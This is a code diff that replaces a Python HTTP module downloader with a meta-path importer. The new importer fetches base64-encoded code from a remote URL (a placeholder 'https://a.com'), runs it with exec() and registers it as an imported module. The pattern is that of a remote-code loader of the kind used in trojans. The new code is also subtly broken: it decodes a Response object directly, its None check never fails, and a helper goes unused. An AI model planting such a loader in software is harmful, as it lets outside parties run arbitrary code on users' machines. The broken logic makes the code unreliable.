@@ -1,49 +1,40 @@
-import importlib
+import base64
+import importlib.util
 import sys
-
-import re
 import requests
-
-from config import HEADERS
-from util.loader import ModuleLoader
-from util.finder import ModuleFinder
-from util.path_constructor import StorageViewCreater
+from importlib.abc import MetaPathFinder
 
 
-class HTTPImporterModule(StorageViewCreater):
-    def __init__(self):
-        super().__init__()
-        self._modules_for_import: list = []
+def get_file_contents(dirname, module_name, repo):
+    return repo.file_contents(f'{dirname}/{module_name}').content
 
-    # todo: handler for - from foo import Foo ... and so on
-    def _get_modules_for_import(self, code) -> None:
-        import_list = re.findall(r"(import\s[a-zA-Z0-9]{,20}\r\n|"
-                                 r"from\s[a-zA-Z0-9]{,20}\simport\s[a-zA-Z0-9]{,10}\r\n)", code)
-        for m in import_list:
-            module = m.split(" ")[1].replace("\r\n", "")
-            self._modules_for_import.append(module)
 
-    def _download_module_in_memory(self, module_name: str) -> tuple[str, dict[str, str]]:
-        module_url = self.dict_of_modules_url[module_name]
-        response = requests.get(module_url, headers=HEADERS, verify=False)
-        if response.ok:
-            module = {module_name: response.text}
-            return module_name, module
-        else:
-            print(f"[-] Response: {response}.\n"
-                  f"[-] Trouble with download.")
+class HTTPImporter(MetaPathFinder):
+    session = None
 
-    @staticmethod
-    def _import_module(module_name: str, module: dict) -> None:
-        finder_object = ModuleFinder(ModuleLoader(module))
-        sys.meta_path.append(finder_object)
-        importlib.import_module(module_name)
+    def __init__(self, url):
+        self.url = url
+        self.repo = None
 
-    def run_importer(self, module_name: str) -> None:
-        module_name, module = self._download_module_in_memory(module_name)
-        try:
-            self._import_module(module_name, module)
-        except ModuleNotFoundError:
-            self._get_modules_for_import(module[module_name])
-            for m in self._modules_for_import:
-                self.run_importer(m)
+        if HTTPImporter.session is None:
+            HTTPImporter.session = requests.Session()
+        self.current_module_code = ""
+
+    def find_module(self, name, path=None):
+        print(f"[*] Attempting to retrieve {name}")
+        new_library = HTTPImporter.session.get(''.join([self.url, name.replace(".", "/")]))
+        if new_library is not None:
+            self.current_module_code = base64.b64decode(new_library)
+            return self
+
+    def load_module(self, name):
+        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.url, is_package=True)
+        new_module = importlib.util.module_from_spec(spec)
+        exec(self.current_module_code, new_module.__dict__)
+        sys.modules[spec.name] = new_module
+        return new_module
+
+
+if __name__ == '__main__':
+    sys.meta_path.append(HTTPImporter("https://a.com"))
+    print(sys.meta_path)
